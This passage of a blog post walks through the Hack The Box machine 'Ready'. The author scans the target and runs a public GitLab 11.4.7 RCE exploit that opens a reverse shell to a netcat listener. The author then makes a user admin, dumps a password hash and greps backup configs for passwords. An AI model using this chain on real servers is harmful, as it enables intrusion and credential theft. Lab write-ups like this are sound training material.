<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Ready" /><meta property="og:locale" content="en" /><meta name="description" content="Ready" /><meta property="og:description" content="Ready" /><link rel="canonical" href="https://gore-ez-knee.github.io/posts/ready/" /><meta property="og:url" content="https://gore-ez-knee.github.io/posts/ready/" /><meta property="og:site_name" content="Gore-Ez-Knee" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-19T23:00:00-06:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Ready" /><meta name="twitter:site" content="@gore_ez_knee" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-02-28T22:56:04-06:00","datePublished":"2022-02-19T23:00:00-06:00","description":"Ready","headline":"Ready","mainEntityOfPage":{"@type":"WebPage","@id":"https://gore-ez-knee.github.io/posts/ready/"},"url":"https://gore-ez-knee.github.io/posts/ready/"}</script><title>Ready | Gore-Ez-Knee</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Gore-Ez-Knee"><meta name="application-name" content="Gore-Ez-Knee"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Gore-Ez-Knee</a></div><div class="site-subtitle font-italic">Nerd</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/gore-ez-knee" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/gore_ez_knee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gore.ez.knee','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Ready</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Ready</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/gore_ez_knee">Gore-Ez-Knee</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1645333200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-02-19 </em> </span> <span> Updated <em class="timeago" data-ts="1646110564" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-01 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2038 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="ready"><strong>Ready</strong></h1><h2 id="enumeration"><span class="mr-2"><strong>Enumeration</strong></span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/ready 10.10.10.220 
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 23:50 EDT
Nmap scan report for 10.10.10.220
Host is up (0.066s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
</span><span class="gp">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.84 seconds
</span></pre></table></code></div></div><hr /><h2 id="gitlab"><span class="mr-2"><strong>GitLab</strong></span><a href="#gitlab" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/img/post_images/ready/20210504235511.png" alt="Gitlab Homepage" data-proofer-ignore></p><p>After completing the <strong>Laboratory</strong> Box, I knew you could checkout the <code class="language-plaintext highlighter-rouge">/help</code> page to get a version number of GitLab.</p><p><img data-src="/assets/img/post_images/ready/20210505194213.png" alt="Gitlab before login" data-proofer-ignore></p><p>Huh, I guess you have to create a user first.</p><p>After creating a user <code class="language-plaintext highlighter-rouge">y00ser:password123</code>, I login and return to the <code class="language-plaintext highlighter-rouge">/help</code> page to see a GitLab Community Edition version number <code class="language-plaintext highlighter-rouge">11.4.7</code></p><p><img data-src="/assets/img/post_images/ready/20210505000358.png" alt="Gitlab after login" data-proofer-ignore></p><hr /><h2 id="foothold"><span class="mr-2"><strong>Foothold</strong></span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Using searchsploit to see if there are any available exploits for GitLab shows some promise. There appears to be two python scripts that can give us remote code execution (RCE).</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>searchsploit gitlab
<span class="go">---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
---[snip]---
GitLab 11.4.7 - RCE (Authenticated) (2)             | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticate | ruby/webapps/49257.py
---[snip]---
</span></pre></table></code></div></div><p>I copy one of the scripts to my current directory with <code class="language-plaintext highlighter-rouge">searchsploit -m ruby/webapps/49334.py</code>.</p><p>I use the scripts <code class="language-plaintext highlighter-rouge">-h</code> flag to see what arguments are needed:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 49334.py <span class="nt">-h</span>
<span class="go">usage: 49334.py [-h] -u U -p P -g G -l L -P P

GitLab 11.4.7 RCE

optional arguments:
  -h, --help  show this help message and exit
  -u U        GitLab Username/Email
  -p P        Gitlab Password
  -g G        Gitlab URL (without port)
  -l L        reverse shell ip
  -P P        reverse shell port
</span></pre></table></code></div></div><p>So I supply the script with the needed arguments, run <code class="language-plaintext highlighter-rouge">nc -lvnp 9001</code> on another shell tab, and execute the script:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 49334.py <span class="nt">-u</span> y00ser <span class="nt">-p</span> password123 <span class="nt">-g</span> http://10.10.10.220 <span class="nt">-l</span> 10.10.14.2 <span class="nt">-P</span> 9001                                                                                                                                             
<span class="go">[+] authenticity_token: UURyorKkxmg8KQUkog7skIQdeZjNQv4qATa83Enyb7VaC+97Op4Bcz4zX/+NLei82VB96whWqpaXApdGIMlQGw==
[+] Creating project with random name: project4017
[+] Running Exploit
[+] Exploit completed successfully!
</span></pre></table></code></div></div><p>And on my <code class="language-plaintext highlighter-rouge">nc</code> tab, I see the connection, but no output. I run some simple commands and see if python is installed on the system. Then I create a better looking shell.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 9001                                                                 
<span class="go">listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.220] 42046
whoami
git
which python
which python3
/opt/gitlab/embedded/bin/python3
</span><span class="gp">/opt/gitlab/embedded/bin/python3 -c 'import pty;</span><span class="w"> </span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
</span><span class="gp">git@gitlab:~/gitlab-rails/working$</span><span class="w"> 
</span></pre></table></code></div></div><p>I tried make the shell more stable by backgrounding the session, running <code class="language-plaintext highlighter-rouge">stty raw -echo</code> and returning to the process, but my entire bash screen would freeze so I abandoned trying to get it to work. So I guess I won’t have tab completion. That’s okay.</p><p><strong>Looking Back</strong>: It might’ve worked if I ran <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code>.</p><hr /><h2 id="user"><span class="mr-2"><strong>User</strong></span><a href="#user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Initally I believed this was going to be similar to <strong>Laboratory</strong>, so I used what I had learned and made my user an admin. Using <code class="language-plaintext highlighter-rouge">gitlab-rails console</code>:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">gitlab-rails console
-------------------------------------------------------------------------------------
 GitLab:       11.4.7 (98f8423)
 GitLab Shell: 8.3.3
 postgresql:   9.6.8
-------------------------------------------------------------------------------------
Loading production environment (Rails 4.2.10)
</span><span class="gp">irb(main):001:0&gt;</span><span class="w"> </span>user <span class="o">=</span> User.find_by<span class="o">(</span>username: <span class="s1">'y00ser'</span><span class="o">)</span>
<span class="go">user = User.find_by(username: 'y00ser')
</span><span class="gp">=&gt;</span><span class="w"> </span><span class="c">#&lt;User id:7 @y00ser&gt;</span>
<span class="gp">irb(main):002:0&gt;</span><span class="w"> </span>user.admin <span class="o">=</span> <span class="nb">true</span>
<span class="go">user.admin = true
</span><span class="gp">=&gt;</span><span class="w"> </span><span class="nb">true</span>
<span class="gp">irb(main):003:0&gt;</span><span class="w"> </span>user.save!
<span class="go">user.save!
</span><span class="gp">=&gt;</span><span class="w"> </span><span class="nb">true</span>
</pre></table></code></div></div><p>Also while I’m here, I’d like to check out the user <code class="language-plaintext highlighter-rouge">dude</code> who I saw in the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. Listing out his attributes, I find a password hash:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">irb(main):006:0&gt;</span><span class="w"> </span>u <span class="o">=</span> User.find<span class="o">(</span>2<span class="o">)</span>
<span class="go">u = User.find(2)
</span><span class="gp">=&gt;</span><span class="w"> </span><span class="c">#&lt;User id:2 @dude&gt;</span>
<span class="gp">irb(main):007:0&gt;</span><span class="w"> </span>pp u.attributes
<span class="go">pp u.attributes
</span><span class="gp">{"id"=&gt;</span>2,
<span class="gp"> "email"=&gt;</span><span class="s2">"dude@ready.com"</span>,
<span class="gp"> "encrypted_password"=&gt;</span><span class="w">
</span><span class="gp">  "$</span>2a<span class="nv">$10$NOMTXhO31vqykicMa6zj3O</span>.F5PIyI9q/S4c.v22eMSfXNDdtpI2Mm<span class="s2">",
</span></pre></table></code></div></div><p>It appears it’s a bcrypt password so I don’t think I’m going to be able to decrypt it anytime soon.</p><p>I logged back into GitLab and explored the users, projects, repositories in the admin panel to find anything of value, but didn’t find anything. So this doesn’t look like it’ll be exactly like <strong>Laboratory</strong>.</p><p>Checking out the home directory, there is only one user <code class="language-plaintext highlighter-rouge">dude</code>. Inside is the user flag:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">git@gitlab:~/gitlab-rails/working$</span><span class="w"> </span><span class="nb">cd</span> /home
<span class="go">cd /home
</span><span class="gp">git@gitlab:/home$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
dude
</span><span class="gp">git@gitlab:/home$</span><span class="w"> </span><span class="nb">cd </span>dude
<span class="go">cd dude
</span><span class="gp">git@gitlab:/home/dude$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
user.txt
</span><span class="gp">git@gitlab:/home/dude$</span><span class="w">
</span></pre></table></code></div></div><p>Viewing the contents of the root directory <code class="language-plaintext highlighter-rouge">/</code> gives us a clue that we are inside of a docker container</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="gp">git@gitlab:/$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span>
<span class="go">ls -al
total 104
drwxr-xr-x   1 root root 4096 Dec  1 12:41 .
drwxr-xr-x   1 root root 4096 Dec  1 12:41 ..
-rwxr-xr-x   1 root root    0 Dec  1 12:41 .dockerenv
-rw-r--r--   1 root root  185 Nov 20  2018 RELEASE
drwxr-xr-x   2 root root 4096 Nov 20  2018 assets
drwxr-xr-x   1 root root 4096 Dec  1 15:40 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x  13 root root 3760 May  4 18:16 dev
drwxr-xr-x   1 root root 4096 Dec  2 10:45 etc
drwxr-xr-x   1 root root 4096 Dec  2 10:45 home
drwxr-xr-x   1 root root 4096 Sep 13  2015 lib
drwxr-xr-x   2 root root 4096 Nov 13  2018 lib64
drwxr-xr-x   2 root root 4096 Nov 13  2018 media
drwxr-xr-x   1 root root 4096 May  5 14:08 mnt
drwxr-xr-x   1 root root 4096 Dec  1 16:23 opt
dr-xr-xr-x 401 root root    0 May  4 18:16 proc
drwx------   1 root root 4096 Dec 13 15:06 root
-rw-r--r--   1 root root   23 Jun 29  2020 root_pass
drwxr-xr-x   1 root root 4096 Dec 13 15:07 run
drwxr-xr-x   1 root root 4096 Nov 19  2018 sbin
drwxr-xr-x   2 root root 4096 Nov 13  2018 srv
dr-xr-xr-x  13 root root    0 May  4 18:16 sys
drwxrwxrwt   1 root root 4096 May  5 14:34 tmp
drwxr-xr-x   1 root root 4096 Nov 13  2018 usr
drwxr-xr-x   1 root root 4096 Nov 13  2018 var
</span><span class="gp">git@gitlab:/$</span><span class="w">
</span></pre></table></code></div></div><p>We see a <code class="language-plaintext highlighter-rouge">.dockerenv</code> file which tips us off. There’s also a very interesting file called <code class="language-plaintext highlighter-rouge">root_pass</code> inside of the root directory:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">git@gitlab:/$</span><span class="w"> </span><span class="nb">cat </span>root_pass
<span class="go">cat root_pass
YG65407Bjqvv9A0a8Tm_7w
</span></pre></table></code></div></div><p>I wonder if we can use that to switch user <code class="language-plaintext highlighter-rouge">su</code> to root:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">git@gitlab:/$</span><span class="w"> </span>su - root
<span class="go">su - root
Password: YG65407Bjqvv9A0a8Tm_7w

su: Authentication failure
</span><span class="gp">git@gitlab:/$</span><span class="w">
</span></pre></table></code></div></div><p>Nope, I guess that won’t work. This is the point I go down several rabbit holes, but ultimately this comes down to knowing what’s normal and what isn’t normal on a linux filesystem. I used LinPEAS to enumerate for me and I glanced over the directory I should’ve looked at. We can see a lot of our stuff is in <code class="language-plaintext highlighter-rouge">/var/opt/gitlab</code> but there is another directory we see a few things in too, which is <code class="language-plaintext highlighter-rouge">/opt/gitlab</code>. Normally you don’t see a lot of things in <code class="language-plaintext highlighter-rouge">/opt</code>. <code class="language-plaintext highlighter-rouge">/opt</code> is used for “the installation of add-on application software packages.” But if you were to check out your <code class="language-plaintext highlighter-rouge">/opt</code> directory on your attack box now, you probably wouldn’t see but maybe one or two items in there. Try running <code class="language-plaintext highlighter-rouge">echo $PATH</code> and you probably won’t see <code class="language-plaintext highlighter-rouge">/opt</code> in there either. But remember when I ran <code class="language-plaintext highlighter-rouge">which python3</code>? The <code class="language-plaintext highlighter-rouge">python3</code> binary was in <code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/bin</code>. In fact if I were to run <code class="language-plaintext highlighter-rouge">echo $PATH</code> on this box I would see:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">git@gitlab:/$</span><span class="w"> </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="gp">echo $</span>PATH
<span class="go">/opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin:/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin
</span></pre></table></code></div></div><p>There seems to be some important stuff in <code class="language-plaintext highlighter-rouge">/opt</code>. Of course this is hindsight now, but it shows the importance of knowing what you should normally see on a box. So let’s see what is in <code class="language-plaintext highlighter-rouge">/opt</code>:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">ls -al /opt
total 24
drwxr-xr-x 1 root root 4096 Dec  1 16:23 .
drwxr-xr-x 1 root root 4096 Dec  1 12:41 ..
drwxr-xr-x 2 root root 4096 Dec  7 09:25 backup
drwxr-xr-x 1 root root 4096 Dec  1 12:41 gitlab
</span></pre></table></code></div></div><p>Backups have a tendency to show some goodies. Let’s see if there is a <code class="language-plaintext highlighter-rouge">password</code> inside any of these files. I start broad and work my way down:</p><p>First I grep for <code class="language-plaintext highlighter-rouge">password</code> across all files in the directory:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="gp">git@gitlab:/opt/backup$</span><span class="w"> </span><span class="nb">grep</span> <span class="s1">'password'</span> <span class="k">*</span>
<span class="go">grep 'password' *
docker-compose.yml:        gitlab_rails['initial_root_password']=File.read('/root_pass')
</span><span class="gp">gitlab.rb:#</span><span class="c">### Email account password</span>
<span class="gp">gitlab.rb:#</span><span class="w"> </span>gitlab_rails[<span class="s1">'incoming_email_password'</span><span class="o">]</span> <span class="o">=</span> <span class="s2">"[REDACTED]"</span>
<span class="gp">gitlab.rb:#</span><span class="w">     </span>password: <span class="s1">'_the_password_of_the_bind_user'</span>
<span class="gp">gitlab.rb:#</span><span class="w">     </span>password: <span class="s1">'_the_password_of_the_bind_user'</span>
<span class="gp">gitlab.rb:#</span><span class="w">   </span><span class="s1">'/users/password'</span>,
<span class="gp">gitlab.rb:#</span><span class="c">### Change the initial default admin password and shared runner registration tokens.</span>
<span class="gp">gitlab.rb:#</span><span class="w"> </span>gitlab_rails[<span class="s1">'initial_root_password'</span><span class="o">]</span> <span class="o">=</span> <span class="s2">"password"</span>
<span class="gp">gitlab.rb:#</span><span class="w"> </span>gitlab_rails[<span class="s1">'db_password'</span><span class="o">]</span> <span class="o">=</span> nil
<span class="gp">gitlab.rb:#</span><span class="w"> </span>gitlab_rails[<span class="s1">'redis_password'</span><span class="o">]</span> <span class="o">=</span> nil
<span class="gp">gitlab.rb:gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#</span>h<span class="s2">"
</span><span class="gp">gitlab.rb:#</span><span class="w"> </span><span class="s2">gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
</span><span class="gp">gitlab.rb:#</span><span class="s2">#! </span><span class="sb">`</span>SQL_USER_PASSWORD_HASH<span class="sb">`</span><span class="s2"> can be generated using the command </span><span class="sb">`</span>gitlab-ctl pg-password-md5 gitlab<span class="sb">`</span><span class="s2">
</span><span class="gp">gitlab.rb:#</span><span class="w"> </span><span class="s2">postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
</span><span class="gp">gitlab.rb:#</span><span class="w"> </span><span class="s2">postgresql['sql_replication_password'] = "</span>md5 <span class="nb">hash </span>of postgresql password<span class="s2">" # You can generate with </span><span class="sb">`</span>gitlab-ctl pg-password-md5 &lt;dbuser&gt;<span class="sb">`</span><span class="s2">
</span><span class="gp">gitlab.rb:#</span><span class="w"> </span><span class="s2">redis['password'] = 'redis-password-goes-here'
